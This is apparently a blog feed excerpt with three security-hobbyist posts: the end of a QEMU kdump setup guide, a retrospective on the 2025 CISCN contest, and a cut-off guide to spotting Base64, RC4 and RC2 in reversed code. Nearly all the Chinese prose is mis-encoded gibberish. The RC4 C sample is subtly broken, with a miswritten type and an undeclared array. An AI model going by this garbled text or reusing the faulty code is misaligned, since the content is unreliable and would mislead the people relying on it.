kdumpï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ç”¨<code>echo c &gt; /proc/sysrq-trigger</code>è§¦å‘å†…æ ¸å´©æºƒäº†ã€‚åœ¨æˆ‘ç”¨çš„ubuntubaseä¸Šè¿™ä¸ªé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯å¯ä»¥è‡ªè¡ŒæŸ¥æ‰¾å¼€å¯æ–¹æ³•ï¼Œå†™ä¸€ä¸ª1å°±è¡Œã€‚ä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œkdumpä¼šè‡ªåŠ¨è§¦å‘å†…æ ¸é‡å¯ï¼Œå¹¶åœ¨/var/crashä¸‹ç•™ä¸‹ä¸€ä¸ªä»¥æ—¶é—´å‘½åçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«æœ‰dmesgå’Œå‹ç¼©åçš„å†…æ ¸çš„å†…å­˜è½¬å‚¨ï¼ˆé»˜è®¤æ˜¯åªä¿ç•™å†…æ ¸ç©ºé—´æ­£åœ¨ä½¿ç”¨çš„é¡µæ¡†ï¼‰ã€‚ç„¶åç”¨crashé€‰å®šå¸¦è°ƒè¯•ä¿¡æ¯çš„å†…æ ¸ï¼ˆä¹Ÿå°±æ˜¯qemuå¯åŠ¨å‚æ•°æŒ‡å®šçš„å†…æ ¸ï¼Œé€‰æ ¹ç›®å½•çš„vmlinuxï¼‰ï¼Œå°±å¯ä»¥æŸ¥çœ‹è½¬å‚¨åˆ†æäº†ã€‚</p><h1>æ€»ç»“</h1><p>è¿™æ¬¡ä»0å¼€å§‹ï¼Œç›¸å½“äºæ˜¯å€ŸåŠ©qemuä»0æ­äº†ä¸ªlinuxæœºå™¨ã€‚ä¸­é—´é‡åˆ°å„ç§å„æ ·çš„é—®é¢˜ï¼ŒåŒ…æ‹¬systemdçš„æœåŠ¡æŠ¥é”™ï¼Œæœºå™¨å…³ä¸äº†ï¼Œå´©æºƒäº†ä¸é‡å¯ï¼Œåœåœ¨initramfsè¿›ä¸å»ï¼Œvmcoreæœ‰äº†åˆ†æä¸äº†ä¸€ç›´æŠ¥é”™ç­‰ç­‰â€¦ç•™ä¸ªå½’æ¡£</p><h1>åç»­</h1><p>å†…éƒ¨æ— æ³•ä¸Šç½‘ï¼Œè§£å†³äº†ã€‚é¦–å…ˆaptå®‰è£…<code>netplan.io</code>ååˆ›å»º/etc/netplan/01-netcfg.yamlï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span> <span class="comment"># æˆ–è€… networkmanager å¦‚æœä½ å®‰è£…å¹¶ä½¿ç”¨å®ƒ</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">enp0s3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># å¯é€‰: å¦‚æœ IPv6 ä¹Ÿéœ€è¦ DHCP</span></span><br><span class="line">      <span class="comment"># dhcp6: true</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ<code>netplan apply</code>å°±å¯ä»¥äº†ã€‚resolv.confçš„é…ç½®å°±ä¸èµ˜è¿°äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;OSæ¯”èµ›çš„ç¯å¢ƒæ­å»ºæŠ˜ç£¨äº†æˆ‘ä¸¤å¤©ï¼Œå› æ­¤æœ‰å¿…è¦åœ¨è¿™é‡Œè®°å½•ä¸‹å…¨è¿‡ç¨‹ï¼Œä»¥åè‡ªå·±æƒ³ç”¨ä»€ä¹ˆç³»ç»Ÿä¹Ÿä¼šæ–¹ä¾¿ä¸€ç‚¹ã€‚è€Œä¸”ç½‘ä¸Šçš„blogå¯¹äºå‘æ˜¯åªå­—ä¸æå•Šæˆ‘æ—¥ã€‚&lt;/p&gt;
&lt;p&gt;ç›®å‰èƒ½å¤Ÿå®Œç¾è¿è¡Œkdumpçš„ç¯å¢ƒï¼ŒåŸºäºï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;</summary>
      
    
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/categories/kernel/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="kdump" scheme="https://zjw1nd.github.io/tags/kdump/"/>
    
  </entry>
  
  <entry>
    <title>2025ciscnccbå¤ç›˜å°è®°</title>
    <link href="https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/"/>
    <id>https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2025-03-17T14:28:55.000Z</published>
    <updated>2025-07-23T09:08:35.394Z</updated>
    
    <content type="html"><![CDATA[<p>è™½ç„¶å¤±è´¥äº†ä½†æ˜¯è¿˜æ˜¯ç®€å•è®°å½•ä¸‹é‡åˆ°çš„é—®é¢˜</p><h1>awdp</h1><p>é¦–å…ˆï¼Œè¿™æ˜¯æœ€æ— è¯­çš„ç¯èŠ‚ï¼Œç­‰è¿‡å‡ å¤©é€‰æ‰‹çš„blogå¯èƒ½ä¼šæœ‰wpç ”ç©¶ä¸‹ï¼Œæœ€ç®€å•çš„é¢˜ç›®10æ¬¡ç”¨å®Œäº†éƒ½ä¸€ç›´æ“ä½œå¤±è´¥æ˜¯çœŸçš„ä¸æ‡‚ã€‚æ•´ä¸ªç¨‹åºåªæœ‰addï¼Œeditå’Œdeleteã€‚deleteè™½ç„¶æ²¡æœ‰UAFä½†æ˜¯è°¨æ…èµ·è§æˆ‘ä¹ŸæŠŠfree nopäº†ã€‚è€Œaddåˆ™ä¸å…è®¸è¾“å…¥ï¼Œåªæœ‰ä¸€ä¸ªidxã€‚</p><p>edité‡Œå­˜åœ¨æ¼æ´ï¼Œsnprintfä»–è¿·æƒ‘äººï¼Œå°†fmtå’Œå®é™…readçš„0x100ä¸¤ä¸ªå‚æ•°å¯¹è°ƒäº†ä¸€ä¸‹ï¼Œçœ‹ç€æ²¡é—®é¢˜ï¼Œå®é™…ä¸ŠVulFiä¸€æ‰«æˆ–è€…é¼ æ ‡æ”¾ä¸Šå»çœ‹ä¸€ä¸‹å‡½æ•°åŸå‹å°±çŸ¥é“äº†ï¼ŒæŠŠè¿™ä¸ªä¿®äº†ï¼Œæ²¡è¿‡ã€‚åé¢çš„è¾“å…¥ç¯èŠ‚ä¹Ÿä¸ä¼šæº¢å‡ºï¼Œå¤§å°å…¨æ˜¯æ— ç¬¦å·checkï¼Œsizeç‹¬ç«‹æ”¾åœ¨chunkå†…éƒ¨ã€‚</p><p>æˆ‘æ‰¿è®¤ä¸­é—´æµªè´¹äº†å¾ˆå¤šæœºä¼šï¼ˆè™½ç„¶ä¸çŸ¥é“å…·ä½“åŸå› ï¼‰ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å’Œæœ¬åœ°patchelfäº†libcè·¯å¾„æœ‰å…³ï¼Œ<a href="http://xn--update-957i43fj1g26gzsx1fvmljh3cyy5auo8e.sh">ä¹Ÿå¯èƒ½æ˜¯æ²¡æœ‰æŒ‰ä¾‹å­å†™update.sh</a>ï¼ˆç”¨çš„bashè€Œéshï¼‰ï¼Œè¿˜æœ‰å‡ æ¬¡æ˜¯å‘ç°idaæŠ½é£äº†patchå†™å…¥æ²¡å†™è¿›å»ï¼Œè¿˜æ˜¯gdbåŠ¨è°ƒå‘ç°å’Œidaä¸ä¸€æ ·æ‰çŸ¥é“çš„ã€‚ä½†æ˜¯æœ€åå‡ æ¬¡åº”è¯¥æ²¡æœ‰å…¶ä»–é—®é¢˜äº†æ‰å¯¹ã€‚</p><p>å¦å¤–æœ€åçœ‹äº†ä¸‹ä¸€ä¸ªprotobufçš„é¢˜ã€‚ä½ å¦ˆçš„å›½èµ›å†…éƒ¨æ€€ç–‘æœ‰äººå¤©å¤©ç”¨è¿™ç¥äººprotobufå¼€å‘ï¼Œä»23å¹´åˆ°ç°åœ¨ï¼Œä»åˆèµ›åˆ°å†³èµ›ï¼Œåˆ°å¤„å¡è¿™protobufã€‚è™½ç„¶å½“æ—¶å¤ç°ç ”ç©¶è¿‡ä½†æ˜¯æœ€åæ—¶é—´ä¸å¤Ÿäº†ï¼Œè€Œä¸”æˆ‘linuxä¸Šæ²¡æœ‰protobufç¯å¢ƒï¼Œæ°”ç¬‘äº†ã€‚çœ‹äº†ä¸‹ç»“æ„ä½“ä¹Ÿæ˜¯ä¸ªå‹¾å…«èœå•å †ï¼Œç”¨ç±»ä¼¼è™šæ‹Ÿæœº/vtableçš„å½¢å¼è¿›è¡Œè°ƒç”¨ï¼Œæ‰¾äº†ä¸‹è¾“å…¥ï¼ŒæŠŠmemcpyåŠ«æŒåˆ°ehframeä¸Šè‡ªå·±å®ç°çš„memcpyï¼Œå³è°ƒç”¨ä¹‹å‰æ°¸è¿œå¯¹rdxç½®é›¶ã€‚è¯•äº†ä¸‹ä¸å‡ºæ‰€æ–™çš„æ“ä½œå¤±è´¥äº†ï¼Œprctlé€šé˜²å½“ç„¶ä¹Ÿä¸è¡Œï¼Œäºæ˜¯é—æ†¾ç¦»åœºã€‚</p><h1>isw</h1><p>æ¸—é€å½“ç„¶æ˜¯ä¸æ‡‚å°±ä¸è°ˆäº†ï¼Œé‡ç‚¹è°ˆè°ˆåº”æ€¥å“åº”ã€‚æ²¡æœ‰æ‰¾å¯¹å–è¯å·¥å…·çœŸçš„å¤ªäºäº†ã€‚</p><p>é¦–å…ˆä¸€ä¸ªï¼ŒæŠ“ipæ˜¯å¶å¤§å¸ˆsshä¸Šå»ä¹‹åtcpdumpçœ‹åˆ°çš„ipï¼Œä½†æ˜¯æ²¡æ˜¾ç¤ºè¿›ç¨‹idæˆ–è€…è·¯å¾„ï¼ˆç»“æœåˆ°æœ€åéƒ½æ²¡æ‰¾åˆ°ç¨‹åºâ€¦ï¼‰ã€‚ç„¶å010ç›´æ¥æ‰“å¼€é•œåƒæœipï¼Œç»“æœç›´æ¥æœåˆ°äº†ç¨‹åºï¼Œåé¢å°±ä¸€ç›´æƒ³åŠæ³•æŠŠè¿™ä¸ªæ‹–å‡ºæ¥ã€‚</p><p>ä½†æ˜¯å¾€å‰æ‰¾åˆ°æœ€è¿‘çš„ELFä¹‹åidaæ‰“ä¸å¼€ï¼Œè¿˜æ˜¯è«åå…¶å¦™åªæœ‰å¶å¤§å¸ˆçš„idaèƒ½æ‰“å¼€ä¸çƒ‚â€¦ä»é‡Œé¢ç¿»äº†ç‚¹ä¿¡æ¯md5äº¤äº†å‡ ä¸ªflagã€‚</p><p>AutoPsyä¸€ç›´åœ¨è™šæ‹Ÿæœºé‡Œè·‘è¿™ä¸ªé•œåƒï¼Œåˆæ…¢åˆå¡ã€‚æ¢äº†ä¸€ä¸ªï¼ŒMagnet AXIOMï¼Œä¹Ÿæ˜¯è™šæ‹Ÿæœºé‡Œä¸€ä¸‹å°±å¥½äº†ï¼Œè€Œä¸”sudoçš„å†…å®¹ä¼šå­˜åˆ°auth.logé‡Œé¢ï¼Œç›´æ¥å®¡å†…æ ¸æ—¥å¿—å°±èƒ½å¤åŸå½“æ—¶å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µï¼ŒåŒ…æ‹¬æ–‡ä»¶åå­—ä»€ä¹ˆçš„ï¼ŒçœŸçš„sbå•Šï¼Œé€‰æ‹©è¿œå¤§äºåŠªåŠ›è¿™ä¸€å—ã€‚</p><p>æˆ–è®¸æœ‰å–è¯å¤§å¸ˆä¼šå¥½ä¸€ç‚¹ï¼Ÿ</p><h1>wp</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247487308&amp;idx=1&amp;sn=58ded47969223626e9937b5ccf93d3a8&amp;chksm=cef98a3b1b7ee9a0deeb2746fb95e0bd6fb6e0d7adf55a9902ee121c3e7533efcde91d9498fc&amp;mpshare=1&amp;scene=23&amp;srcid=0318w22pdH0PdB7Tj2Cbw5B0&amp;sharer_shareinfo=a714674b8023b181d0876977bde50035&amp;sharer_shareinfo_first=a714674b8023b181d0876977bde50035#rd">Here</a></p><p>å¾ˆéš¾è¯„ï¼ŒæŸç§æ„ä¹‰ä¸Šè¿™ä¸ªpatchä¹Ÿæ˜¯å¯¹è„‘æ´çš„è¿‡ç¨‹ã€‚è‡³ä»Šæˆ‘ä¹Ÿä¸çŸ¥é“å®ƒä¼šcheckä»€ä¹ˆï¼Œç–‘ä¼¼ä¼šæ£€æŸ¥ç¬¦å·ã€‚</p><h1>æœ€å</h1><ul class="lvl-0"><li class="lvl-2"><p>protobufè¿™ç©æ„ä¼¼ä¹åªæœ‰å›½èµ›ä¸€ç›´åœ¨æâ€¦ï¼Œé…ä¸ªç¯å¢ƒç†Ÿæ‚‰ä¸‹</p></li><li class="lvl-2"><p>åº”æ€¥å“åº”è¿™å—è¿˜æ˜¯å°‘ç‚¹ç»éªŒï¼Œä¹‹å‰å­¦é•¿å‘è¿‡windowsåº”æ€¥å“åº”æ‰‹å†Œï¼Œæ—©çŸ¥é“èµ›å‰å‘åº”æ€¥å“åº”é™„ä»¶ä¹‹åå°±å»çœ‹ä¸‹linuxçš„äº†ï¼Œæ¯”èµ›ç»“æŸæ‰æƒ³èµ·æ¥ã€‚</p></li><li class="lvl-2"><p>patchçš„è¿˜æ˜¯å¤ªæ¿€è¿›äº†ï¼Œä½†æ˜¯é¢˜ç›®ç¡®å®ä¸€å¨ï¼Œsnprintfæ ˆä¸Šæ ¼å¼åŒ–ä¸ºä»€ä¹ˆæ²¡æœ‰expæ‰“â€¦è¿˜æœ‰å“ªé‡Œæ¥çš„å †æº¢å‡ºï¼Œsnprintfå‚æ•°å†™åäº†çœŸçš„æ²¡äººå‘ç°å—â€¦</p></li><li class="lvl-2"><p>ç´¯äº†ï¼Œé˜Ÿé‡Œçš„webæ‰‹ä¹Ÿè¢«åç›´è§‰patchæ¶å¿ƒäº†ï¼ŒåŒ…æ‹¬æ‰«gitç”¨çš„å·¥å…·æœ‰é—®é¢˜æ‰«ä¸å‡ºæ¥ï¼Œç»™çš„é™„ä»¶æ˜¯wwwç»“æœpatchè¦æ”¾åˆ°www/htmlä¸‹â€¦4hè¶…çº§è¿‡è½½å·²ç»ç®¡ä¸äº†äº†</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™½ç„¶å¤±è´¥äº†ä½†æ˜¯è¿˜æ˜¯ç®€å•è®°å½•ä¸‹é‡åˆ°çš„é—®é¢˜&lt;/p&gt;
&lt;h1&gt;awdp&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆï¼Œè¿™æ˜¯æœ€æ— è¯­çš„ç¯èŠ‚ï¼Œç­‰è¿‡å‡ å¤©é€‰æ‰‹çš„blogå¯èƒ½ä¼šæœ‰wpç ”ç©¶ä¸‹ï¼Œæœ€ç®€å•çš„é¢˜ç›®10æ¬¡ç”¨å®Œäº†éƒ½ä¸€ç›´æ“ä½œå¤±è´¥æ˜¯çœŸçš„ä¸æ‡‚ã€‚æ•´ä¸ªç¨‹åºåªæœ‰addï¼Œeditå’Œdeleteã€‚deleteè™½ç„¶æ²¡æœ‰UAFä½†æ˜¯è°¨</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§çš„åŠ å¯†ç¼–ç ç®—æ³•é€†å‘è¯†åˆ«</title>
    <link href="https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2025-03-12T02:07:48.000Z</published>
    <updated>2025-04-25T08:55:33.548Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒè‡ª <a href="https://www.cnblogs.com/Moomin/p/15004170.html#aes">https://www.cnblogs.com/Moomin/p/15004170.html#aes</a></p></blockquote><h1>Base64</h1><h2 id="è¯†åˆ«">è¯†åˆ«</h2><p>ä¸€ä¸ªç´¢å¼•ä¸²<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><h2 id="IO">IO</h2><p>å¯èƒ½åšé­”æ”¹è°ƒæ•´, 6ä½ç´¢å¼•ä¸€ä¸ªasciiç çš„ç´¢å¼•æ¢æ‰ï¼Œæ­¤æ—¶æˆ‘ä»¬ç”¨bytes.maketransæ–¹æ³•å®šä¹‰ä¸€ä¸ªè½¬æ¢å‡½æ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_data = base64.b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = base64.b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é­”æ”¹ï¼š</span></span><br><span class="line">custom_alphabet = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">custom_b64encode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">custom_b64decode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64encode</span>(<span class="params">data</span>):</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">return</span> encoded.translate(custom_b64encode_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64decode</span>(<span class="params">data</span>):</span><br><span class="line">    translated = data.translate(custom_b64decode_table)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(translated)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨è‡ªå®šä¹‰ç´¢å¼•è¡¨è¿›è¡Œç¼–ç </span></span><br><span class="line">encoded_data = custom_b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = custom_b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h1>RC4</h1><h2 id="è¯†åˆ«-2">è¯†åˆ«</h2><p>å¯¹ç§°ï¼ŒæµåŠ å¯†ï¼Œ2ä¸ªæ ¸å¿ƒï¼Œåˆå§‹åŒ–Sç›’ï¼ŒåŠ å¯†å’Œè§£å¯†æ˜¯å¯¹ç§°çš„ã€‚è¯†åˆ«æ–¹å¼ä¸»è¦æ˜¯çœ‹ä¸€ä¸ª256æ¬¡çš„forå¾ªç¯ï¼Œå°¤å…¶æ˜¯sç›’åˆå§‹åŒ–å‡½æ•°ï¼Œå…¶å¯¹256å­—èŠ‚çš„æ•°ç»„æŒ‰ç…§ä¸‹æ ‡ä»0å¼€å§‹èµ‹å€¼ï¼Œè¿™ä¸€ç‰¹å¾æ¯”è¾ƒæ˜æ˜¾ã€‚</p><p>å…¶ä»–ç‰¹å¾å¯ä»¥å‚è€ƒä¸‹é¢çš„ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*åˆå§‹åŒ–å‡½æ•°*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key,<span class="type">unsigned</span> <span class="type">long</span> Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//äº¤æ¢s[i]å’Œs[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*åŠ è§£å¯†*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> Long Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)&#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//äº¤æ¢s[i]å’Œs[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-2">IO</h2><p>éœ€æ±‚cryptoæ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªéšæœºå¯†é’¥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–RC4åŠ å¯†å™¨</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†æ•°æ®</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">encrypted_data = cipher.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–RC4è§£å¯†å™¨</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†æ•°æ®</span></span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯ï¼Œrc4æ˜¯ä¸€ä¸ªæµåŠ å¯†ç®—æ³•ï¼Œæ¯æ¬¡åˆå§‹åŒ–åªèƒ½è·å¾—ä¸€ä¸ªå›ºå®šçš„åŠ å¯†å™¨ï¼Œå³newä¸€æ¬¡ä¹‹åï¼Œåç»­è°ƒç”¨encryptæ—¶ä¼šä¸€ç›´â€œç»§ç»­â€å½“å‰çš„åŠ å¯†ï¼Œå³å‡è®¾å‡ æ¬¡éœ€è¦åŠ å¯†çš„æ˜æ–‡æ˜¯è¿ç»­çš„ã€‚å¦‚æœé¢˜ç›®ä¸­çš„rc4æ¯æ¬¡è°ƒç”¨éƒ½èµ°äº†ä¸€éåˆå§‹åŒ–æµç¨‹ï¼Œåˆ™ioä¹Ÿéœ€è¦å¯¹åº”çš„æ¯æ¬¡éƒ½newä¸€ä¸ªæ–°çš„åŠ å¯†å™¨â€”â€”å³ä½¿å¯†é’¥æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p><p>å¦å¤–ï¼Œrc4ä½œä¸ºå¯¹ç§°åŠ å¯†ï¼ŒåŠ è§£å¯†ç®—æ³•æ˜¯ä¸€æ ·çš„ã€‚</p><h1>RC2/RC5/RC6</h1><p>æ²¡æœ‰é‚£ä¹ˆå¸¸ç”¨å°±æ”¾åœ¨ä¸€èµ·</p><h2 id="è¯†åˆ«-3">è¯†åˆ«</h2><h3 id="RC2">RC2</h3><p>64ä½åˆ†ç»„åŠ å¯†ï¼Œå˜é•¿å¯†é’¥ï¼Œé™¤äº†åŠ è§£å¯†è¿˜æœ‰å¯†é’¥æ‰©å±•ç®—æ³•ã€‚åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc2_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> xkey[<span class="number">64</span>], <span class="type">unsigned</span> <span class="type">char</span> *plain, <span class="type">unsigned</span> <span class="type">char</span> *cipher)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// xkey = K, plain = R</span></span><br><span class="line">    <span class="type">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line">    x76 = (plain[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + plain[<span 